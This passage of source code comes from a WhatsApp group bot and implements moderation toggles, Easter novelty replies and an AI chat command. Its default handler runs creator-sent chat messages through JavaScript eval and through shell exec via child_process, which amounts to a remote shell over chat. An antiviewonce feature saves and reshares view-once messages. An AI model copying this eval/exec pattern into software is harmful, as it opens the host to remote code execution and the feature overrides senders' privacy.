  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  const word = text ? text.toLowerCase().trim() : '';
  if (!word) return reply(`📝 *Usage:* ${prefix}filter <word>\n\n*Example:* ${prefix}filter badword`);
  
  // Initialize filter system if not exists
  if (!global.db.data.chats[m.chat].filterWords) {
    global.db.data.chats[m.chat].filterWords = [];
  }
  
  // Check if word already filtered
  if (global.db.data.chats[m.chat].filterWords.includes(word)) {
    return reply(`⚠️ The word "*${word}*" is already in the filter list!`);
  }
  
  // Add to filter
  global.db.data.chats[m.chat].filterWords.push(word);
  
  reply(`✅ *Filter Added!*\n\n🚫 Word: *${word}*\n📊 Total Filtered Words: *${global.db.data.chats[m.chat].filterWords.length}*\n\n_Messages containing this word will be automatically deleted._`);
}
break;

case 'unfilter':
case 'delfilter': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin to use this feature!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  const word = text ? text.toLowerCase().trim() : '';
  if (!word) return reply(`📝 *Usage:* ${prefix}unfilter <word>\n\n*Example:* ${prefix}unfilter badword`);
  
  if (!global.db.data.chats[m.chat].filterWords || global.db.data.chats[m.chat].filterWords.length === 0) {
    return reply('📝 No filtered words found in this group!');
  }
  
  const index = global.db.data.chats[m.chat].filterWords.indexOf(word);
  if (index === -1) {
    return reply(`⚠️ The word "*${word}*" is not in the filter list!`);
  }
  
  global.db.data.chats[m.chat].filterWords.splice(index, 1);
  
  reply(`✅ *Filter Removed!*\n\n🔓 Word: *${word}*\n📊 Remaining Filtered Words: *${global.db.data.chats[m.chat].filterWords.length}*`);
}
break;

case 'filterlist':
case 'listfilter': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!global.db.data.chats[m.chat].filterWords || global.db.data.chats[m.chat].filterWords.length === 0) {
    return reply('📝 No filtered words in this group!');
  }
  
  let filterText = `┏━━━━━━━━━━━━━━━━━━┓\n`;
  filterText += `┃  🚫 *FILTERED WORDS*  ┃\n`;
  filterText += `┗━━━━━━━━━━━━━━━━━━┛\n\n`;
  
  global.db.data.chats[m.chat].filterWords.forEach((word, index) => {
    filterText += `${index + 1}. ${word}\n`;
  });
  
  filterText += `\n📊 *Total:* ${global.db.data.chats[m.chat].filterWords.length} words`;
  
  reply(filterText);
}
break;

case 'clearfilter': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin to use this feature!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!global.db.data.chats[m.chat].filterWords || global.db.data.chats[m.chat].filterWords.length === 0) {
    return reply('📝 No filtered words to clear!');
  }
  
  const count = global.db.data.chats[m.chat].filterWords.length;
  global.db.data.chats[m.chat].filterWords = [];
  
  reply(`✅ *Filter Cleared!*\n\n🗑️ Removed *${count}* filtered words.`);
}
break;

// ══════════════════════════════════════════════════════════
// 🤖 ANTIBOT SYSTEM
// ══════════════════════════════════════════════════════════

case 'antibot': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin to use this feature!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text) {
    return reply(`📝 *Usage:* ${prefix}antibot <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antibot ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, other bots will be automatically removed from the group._`);
  }
  
  const action = text.toLowerCase();
  
  if (action === 'on' || action === 'enable') {
    if (global.db.data.chats[m.chat].antibot) {
      return reply('⚠️ Antibot is already enabled!');
    }
    
    global.db.data.chats[m.chat].antibot = true;
    
    reply(`✅ *Antibot Enabled!*\n\n🤖 Other bots will be automatically kicked from this group.\n\n⚠️ *Note:* Make sure the bot has admin privileges.`);
    
  } else if (action === 'off' || action === 'disable') {
    if (!global.db.data.chats[m.chat].antibot) {
      return reply('⚠️ Antibot is already disabled!');
    }
    
    global.db.data.chats[m.chat].antibot = false;
    
    reply(`❌ *Antibot Disabled!*\n\n🤖 Other bots can now join this group.`);
    
  } else {
    reply(`❌ *Invalid option!*\n\n📝 Usage: ${prefix}antibot <on/off>`);
  }
}
break;

// ══════════════════════════════════════════════════════════
// 🔞 ANTI-NSFW SYSTEM
// ══════════════════════════════════════════════════════════

case 'antinsfw': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin to use this feature!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text) {
    return reply(`📝 *Usage:* ${prefix}antinsfw <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antinsfw ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, NSFW images will be detected and deleted automatically._`);
  }
  
  const action = text.toLowerCase();
  
  if (action === 'on' || action === 'enable') {
    if (global.db.data.chats[m.chat].antinsfw) {
      return reply('⚠️ Anti-NSFW is already enabled!');
    }
    
    global.db.data.chats[m.chat].antinsfw = true;
    
    reply(`✅ *Anti-NSFW Enabled!*\n\n🔞 NSFW content will be automatically detected and deleted.\n\n⚠️ *Note:* This uses AI detection and may have false positives.`);
    
  } else if (action === 'off' || action === 'disable') {
    if (!global.db.data.chats[m.chat].antinsfw) {
      return reply('⚠️ Anti-NSFW is already disabled!');
    }
    
    global.db.data.chats[m.chat].antinsfw = false;
    
    reply(`❌ *Anti-NSFW Disabled!*\n\n🔓 NSFW content detection is now off.`);
    
  } else {
    reply(`❌ *Invalid option!*\n\n📝 Usage: ${prefix}antinsfw <on/off>`);
  }
}
break;
// ══════════════════════════════════════════════════════════
// 🛡️ ANTI-DELETE SYSTEM
// ══════════════════════════════════════════════════════════

case 'antidelete':
case 'antidel': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antidelete <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antidelete ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, deleted messages will be restored._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antidelete) {
      return reply('⚠️ Anti-delete is already enabled!');
    }
    global.db.data.chats[m.chat].antidelete = true;
    reply('✅ *Anti-Delete Enabled!*\n\n🔒 Deleted messages will now be restored automatically.');
  } else {
    if (!global.db.data.chats[m.chat].antidelete) {
      return reply('⚠️ Anti-delete is already disabled!');
    }
    global.db.data.chats[m.chat].antidelete = false;
    reply('❌ *Anti-Delete Disabled!*\n\n🔓 Deleted messages will no longer be restored.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// ✏️ ANTI-EDIT SYSTEM
// ══════════════════════════════════════════════════════════

case 'antiedit': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antiedit <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antiedit ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, edited messages will be tracked and original version shown._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antiedit) {
      return reply('⚠️ Anti-edit is already enabled!');
    }
    global.db.data.chats[m.chat].antiedit = true;
    reply('✅ *Anti-Edit Enabled!*\n\n✏️ Message edits will now be tracked and displayed.');
  } else {
    if (!global.db.data.chats[m.chat].antiedit) {
      return reply('⚠️ Anti-edit is already disabled!');
    }
    global.db.data.chats[m.chat].antiedit = false;
    reply('❌ *Anti-Edit Disabled!*\n\n🔓 Message edits will no longer be tracked.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 👁️ ANTI-VIEWONCE SYSTEM
// ══════════════════════════════════════════════════════════

case 'antiviewonce':
case 'antiво':
case 'antivo': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antiviewonce <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antiviewonce ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, view-once messages will be saved and reshared._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antiviewonce) {
      return reply('⚠️ Anti-viewonce is already enabled!');
    }
    global.db.data.chats[m.chat].antiviewonce = true;
    reply('✅ *Anti-ViewOnce Enabled!*\n\n👁️ View-once messages will now be saved and displayed.');
  } else {
    if (!global.db.data.chats[m.chat].antiviewonce) {
      return reply('⚠️ Anti-viewonce is already disabled!');
    }
    global.db.data.chats[m.chat].antiviewonce = false;
    reply('❌ *Anti-ViewOnce Disabled!*\n\n🔓 View-once messages will remain private.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 🚫 ANTI-SPAM SYSTEM
// ══════════════════════════════════════════════════════════

case 'antispam': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antispam <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antispam ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, users sending identical messages repeatedly will be warned and kicked._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antispam) {
      return reply('⚠️ Anti-spam is already enabled!');
    }
    global.db.data.chats[m.chat].antispam = true;
    reply('✅ *Anti-Spam Enabled!*\n\n🚫 Spam messages will be detected and users warned/kicked.\n\n⚙️ *Settings:*\n• Max identical messages: 5\n• Time window: 10 seconds\n• Action: Warn → Mute → Kick');
  } else {
    if (!global.db.data.chats[m.chat].antispam) {
      return reply('⚠️ Anti-spam is already disabled!');
    }
    global.db.data.chats[m.chat].antispam = false;
    reply('❌ *Anti-Spam Disabled!*\n\n🔓 Spam detection is now off.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 🌊 ANTI-FLOOD SYSTEM
// ══════════════════════════════════════════════════════════

case 'antiflood': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antiflood <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antiflood ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, users sending too many messages too quickly will be muted._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antiflood) {
      return reply('⚠️ Anti-flood is already enabled!');
    }
    global.db.data.chats[m.chat].antiflood = true;
    reply('✅ *Anti-Flood Enabled!*\n\n🌊 Message flooding will be detected and prevented.\n\n⚙️ *Settings:*\n• Max messages: 10 per 5 seconds\n• Action: Auto-mute for 5 minutes');
  } else {
    if (!global.db.data.chats[m.chat].antiflood) {
      return reply('⚠️ Anti-flood is already disabled!');
    }
    global.db.data.chats[m.chat].antiflood = false;
    reply('❌ *Anti-Flood Disabled!*\n\n🔓 Flood detection is now off.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 📞 ANTI-CALL SYSTEM
// ══════════════════════════════════════════════════════════

case 'anticall': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}anticall <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].anticall ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, group calls will be automatically ended and caller warned._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].anticall) {
      return reply('⚠️ Anti-call is already enabled!');
    }
    global.db.data.chats[m.chat].anticall = true;
    reply('✅ *Anti-Call Enabled!*\n\n📞 Group calls will be automatically ended.');
  } else {
    if (!global.db.data.chats[m.chat].anticall) {
      return reply('⚠️ Anti-call is already disabled!');
    }
    global.db.data.chats[m.chat].anticall = false;
    reply('❌ *Anti-Call Disabled!*\n\n🔓 Group calls are now allowed.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 📊 ANTI-POLL SYSTEM
// ══════════════════════════════════════════════════════════

case 'antipoll': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antipoll <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antipoll ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, polls sent by non-admins will be automatically deleted._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antipoll) {
      return reply('⚠️ Anti-poll is already enabled!');
    }
    global.db.data.chats[m.chat].antipoll = true;
    reply('✅ *Anti-Poll Enabled!*\n\n📊 Only admins can create polls.');
  } else {
    if (!global.db.data.chats[m.chat].antipoll) {
      return reply('⚠️ Anti-poll is already disabled!');
    }
    global.db.data.chats[m.chat].antipoll = false;
    reply('❌ *Anti-Poll Disabled!*\n\n🔓 Everyone can create polls.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 🎭 ANTI-STICKER SYSTEM
// ══════════════════════════════════════════════════════════

case 'antisticker':
case 'antistiker': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antisticker <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antisticker ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, stickers sent by non-admins will be automatically deleted._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antisticker) {
      return reply('⚠️ Anti-sticker is already enabled!');
    }
    global.db.data.chats[m.chat].antisticker = true;
    reply('✅ *Anti-Sticker Enabled!*\n\n🎭 Only admins can send stickers.');
  } else {
    if (!global.db.data.chats[m.chat].antisticker) {
      return reply('⚠️ Anti-sticker is already disabled!');
    }
    global.db.data.chats[m.chat].antisticker = false;
    reply('❌ *Anti-Sticker Disabled!*\n\n🔓 Everyone can send stickers.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 💀 ANTI-VIRTEX SYSTEM (Virus/Crash Messages)
// ══════════════════════════════════════════════════════════

case 'antivirtex':
case 'antivirus': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antivirtex <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antivirtex ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, messages containing crash/virus codes will be deleted and sender kicked._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antivirtex) {
      return reply('⚠️ Anti-virtex is already enabled!');
    }
    global.db.data.chats[m.chat].antivirtex = true;
    reply('✅ *Anti-Virtex Enabled!*\n\n💀 Virus/crash messages will be blocked and sender kicked.');
  } else {
    if (!global.db.data.chats[m.chat].antivirtex) {
      return reply('⚠️ Anti-virtex is already disabled!');
    }
    global.db.data.chats[m.chat].antivirtex = false;
    reply('❌ *Anti-Virtex Disabled!*\n\n🔓 Virtex protection is now off.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 🌐 ANTI-FOREIGN SYSTEM (Non-English Messages)
// ══════════════════════════════════════════════════════════

case 'antiforeign': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antiforeign <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antiforeign ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, non-English messages will be deleted (admins exempt)._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antiforeign) {
      return reply('⚠️ Anti-foreign is already enabled!');
    }
    global.db.data.chats[m.chat].antiforeign = true;
    reply('✅ *Anti-Foreign Enabled!*\n\n🌐 Only English messages allowed (admins exempt).');
  } else {
    if (!global.db.data.chats[m.chat].antiforeign) {
      return reply('⚠️ Anti-foreign is already disabled!');
    }
    global.db.data.chats[m.chat].antiforeign = false;
    reply('❌ *Anti-Foreign Disabled!*\n\n🔓 All languages are now allowed.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 🤬 ANTI-TOXIC SYSTEM
// ══════════════════════════════════════════════════════════

case 'antitoxic':
case 'antibadword': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isBotAdmins) return reply('❌ Bot must be an admin!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}antitoxic <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].antitoxic ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, toxic/offensive language will be filtered and users warned._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].antitoxic) {
      return reply('⚠️ Anti-toxic is already enabled!');
    }
    global.db.data.chats[m.chat].antitoxic = true;
    reply('✅ *Anti-Toxic Enabled!*\n\n🤬 Toxic/offensive language will be filtered.\n\n*Action:* Delete message → Warn user → Mute after 3 warnings');
  } else {
    if (!global.db.data.chats[m.chat].antitoxic) {
      return reply('⚠️ Anti-toxic is already disabled!');
    }
    global.db.data.chats[m.chat].antitoxic = false;
    reply('❌ *Anti-Toxic Disabled!*\n\n🔓 Language filter is now off.');
  }
}
break;

// ══════════════════════════════════════════════════════════
// 📖 AUTO-READ SYSTEM
// ══════════════════════════════════════════════════════════

case 'autoread': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups!');
  if (!isAdmins && !isCreator) return reply('❌ Only admins can use this command!');
  
  if (!text || (text !== 'on' && text !== 'off')) {
    return reply(`📝 *Usage:* ${prefix}autoread <on/off>\n\n*Current Status:* ${global.db.data.chats[m.chat].autoread ? '✅ Enabled' : '❌ Disabled'}\n\n_When enabled, bot will automatically read all messages in this group._`);
  }
  
  if (text === 'on') {
    if (global.db.data.chats[m.chat].autoread) {
      return reply('⚠️ Auto-read is already enabled!');
    }
    global.db.data.chats[m.chat].autoread = true;
    reply('✅ *Auto-Read Enabled!*\n\n📖 Bot will now read all messages automatically.');
  } else {
    if (!global.db.data.chats[m.chat].autoread) {
      return reply('⚠️ Auto-read is already disabled!');
    }
    global.db.data.chats[m.chat].autoread = false;
    reply('❌ *Auto-Read Disabled!*\n\n🔓 Messages will no longer be auto-read.');
  }
}
break;
// ══════════════════════════════════════════════════════════
// 🐣 EASTER COMMANDS
// ══════════════════════════════════════════════════════════

case 'easterwish': {
    const wishes = [
        "🐣 Wishing you a joyful Easter full of love, laughter and endless chocolate!",
        "🥚 May this Easter bring you as many blessings as eggs in the hunt!",
        "🐰 Hoppy Easter! May your day be bright and your basket full!",
        "🌸 Easter blessings to you and yours — may this season bring renewed hope!",
        "🍫 May your Easter be sweet, colourful and filled with wonder!"
    ];
    const wish = wishes[Math.floor(Math.random() * wishes.length)];
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐄𝐀𝐒𝐓𝐄𝐑 𝐖𝐈𝐒𝐇
━━━━━━━━━━━━━━━━━━━

┏━━━〔 🐣 𝐖𝐈𝐒𝐇 〕━━━┓
┃  ${wish}
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'easterquote': {
    const quotes = [
        "\"Easter is the only time it's okay to put all your eggs in one basket.\"",
        "\"Spring is nature's way of saying — let's party!\"",
        "\"The egg is the symbol of new life and resurrection.\"",
        "\"Every day is a fresh beginning, every dawn a little Easter.\"",
        "\"Where flowers bloom, so does hope.\""
    ];
    const quote = quotes[Math.floor(Math.random() * quotes.length)];
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐄𝐀𝐒𝐓𝐄𝐑 𝐐𝐔𝐎𝐓𝐄
━━━━━━━━━━━━━━━━━━━

┏━━━〔 💬 𝐐𝐔𝐎𝐓𝐄 〕━━━┓
┃  ${quote}
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'egghunt': {
    const eggs  = ['🥚','🥚','🥚','🐣','🥚','🥚','🐰','🥚','🥚','🥚'];
    const found = eggs[Math.floor(Math.random() * eggs.length)];
    const prize = found === '🐣' ? 'ʏᴏᴜ ꜰᴏᴜɴᴅ ᴀ ʜᴀᴛᴄʜᴇᴅ ᴇɢɢ! 🎉' :
                  found === '🐰' ? 'ʏᴏᴜ ꜰᴏᴜɴᴅ ᴛʜᴇ ᴇᴀsᴛᴇʀ ʙᴜɴɴʏ! 🏆' :
                  'ʏᴏᴜ ꜰᴏᴜɴᴅ ᴀɴ ᴇɢɢ!';
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐄𝐆𝐆 𝐇𝐔𝐍𝐓
━━━━━━━━━━━━━━━━━━━

┏━━━〔 🥚 𝐑𝐄𝐒𝐔𝐋𝐓 〕━━━┓
┃  ʏᴏᴜ sᴇᴀʀᴄʜᴇᴅ ᴛʜᴇ ɢᴀʀᴅᴇɴ...
┃
┃  ᴀɴᴅ ꜰᴏᴜɴᴅ → ${found}
┃
┃  ${prize}
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'hatchegg': {
    const hatch = ['🐥','🐇','🦋','🐉','⭐'][Math.floor(Math.random() * 5)];
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐇𝐀𝐓𝐂𝐇 𝐄𝐆𝐆
━━━━━━━━━━━━━━━━━━━

┏━━━〔 🥚 𝐇𝐀𝐓𝐂𝐇𝐈𝐍𝐆 〕━━━┓
┃  🥚 ᴄʀᴀᴄᴋ...
┃  🥚💥 sʜᴀᴛᴛᴇʀɪɴɢ...
┃
┃  ${hatch} ʜᴀᴛᴄʜᴇᴅ!
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'goldegg': {
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐆𝐎𝐋𝐃𝐄𝐍 𝐄𝐆𝐆
━━━━━━━━━━━━━━━━━━━

┏━━━〔 ✨ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 〕━━━┓
┃  ʏᴏᴜ ᴅɪsᴄᴏᴠᴇʀᴇᴅ
┃  ᴛʜᴇ ʟᴇɢᴇɴᴅᴀʀʏ
┃
┃       🥇🥚🥇
┃
┃  ɢᴏʟᴅᴇɴ ᴇɢɢ!
┃  ʀᴀʀᴇ ᴅʀᴏᴘ — 1% ᴄʜᴀɴᴄᴇ
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'bunny':
case 'easterrabbit': {
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐄𝐀𝐒𝐓𝐄𝐑 𝐁𝐔𝐍𝐍𝐘
━━━━━━━━━━━━━━━━━━━

┏━━━〔 🐰 𝐁𝐔𝐍𝐍𝐘 〕━━━┓
┃
┃   (\\(\\ 
┃   ( -.-)
┃   o_(")(")
┃
┃  ʜᴏᴘᴘʏ ᴇᴀsᴛᴇʀ! 🐣
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'easterbasket': {
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐄𝐀𝐒𝐓𝐄𝐑 𝐁𝐀𝐒𝐊𝐄𝐓
━━━━━━━━━━━━━━━━━━━

┏━━━〔 🧺 𝐁𝐀𝐒𝐊𝐄𝐓 〕━━━┓
┃  🥚 x3  ᴇᴀsᴛᴇʀ ᴇɢɢs
┃  🍫 x2  ᴄʜᴏᴄᴏʟᴀᴛᴇ ᴇɢɢs
┃  🐣 x1  ʜᴀᴛᴄʜᴇᴅ ᴄʜɪᴄᴋ
┃  🌸 x4  sᴘʀɪɴɢ ꜰʟᴏᴡᴇʀs
┃  🍬 x5  ᴄᴀɴᴅɪᴇs
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

case 'painteg':
case 'decorateegg':
case 'eggdesign': {
    const designs = [
        '🔴⭐🔵 sᴛᴀʀ ᴅᴇsɪɢɴ',
        '🌈🌀💫 sᴘɪʀᴀʟ ᴅᴇsɪɢɴ',
        '🖤🟡💛 ʟᴜᴍᴏʀᴀ ᴅᴇsɪɢɴ',
        '❄️💙🌊 ɪᴄᴇ ᴅᴇsɪɢɴ',
        '🌸🌺🌷 ꜰʟᴏʀᴀʟ ᴅᴇsɪɢɴ'
    ];
    const design = designs[Math.floor(Math.random() * designs.length)];
    reply(
`━━━━━━━━━━━━━━━━━━━
「写輪眼」 𝐄𝐆𝐆 𝐃𝐄𝐒𝐈𝐆𝐍
━━━━━━━━━━━━━━━━━━━

┏━━━〔 🎨 𝐑𝐄𝐒𝐔𝐋𝐓 〕━━━┓
┃  ʏᴏᴜʀ ᴇɢɢ ʜᴀs ʙᴇᴇɴ
┃  ᴅᴇᴄᴏʀᴀᴛᴇᴅ ᴡɪᴛʜ:
┃
┃  ${design}
┗━━━━━━━━━━━━━━━━━━━┛

「忍」ɪᴛᴀᴄʜɪ ᴍᴅ v2 ʙᴇᴛᴀ · @dev_kingsley
━━━━━━━━━━━━━━━━━━━`
    );
}
break;

const { aiCore } = require("./aiCore");

case 'ai':
case 'ask':
case 'gpt': {

    const text = args.join(" ");
    if (!text) return reply("❌ Send a message.");

    await rich.sendPresenceUpdate("composing", m.chat);

    const res = await aiCore(m.sender, text, {
        useCoins: false // change to true if you want paid AI
    });

    if (!res.ok) return reply(res.message);

    return reply(`
🤖 AI RESPONSE

${res.text}

💰 Coins: ${res.coins}
    `);
}
break;

default:
if (body.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${body.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (body.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(body.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (body.startsWith('®')) {
if (!isCreator) return;
require("child_process").exec(body.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})